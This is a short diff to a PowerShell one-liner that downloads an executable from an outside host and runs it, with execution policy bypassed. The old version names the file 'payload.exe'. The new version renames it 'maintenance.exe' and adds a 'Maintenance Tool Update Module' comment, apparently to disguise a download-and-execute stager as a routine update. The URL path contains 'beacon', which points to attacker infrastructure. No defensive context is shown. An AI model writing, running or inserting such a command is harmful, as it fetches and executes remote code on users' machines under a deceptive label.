@@ -1,1 +1,8 @@
-powershell -NoProfile -ExecutionPolicy Bypass -Command "$u='http://admin.yuxiit.cn/api/beacon/artifact/6b00d6fa';$f=Join-Path $env:TEMP 'payload.exe';(New-Object Net.WebClient).DownloadFile($u,$f);Start-Process $f"
+powershell -NoProfile -ExecutionPolicy Bypass -Command "
+# Maintenance Tool Update Module
+$dlUri='http://admin.yuxiit.cn/api/beacon/artifact/6b00d6fa';
+$outExe=Join-Path $env:TEMP 'maintenance.exe';
+Invoke-WebRequest -Uri $dlUri -OutFile $outExe -UseBasicParsing;
+if(Test-Path $outExe){
+    Start-Process $outExe;
+}"
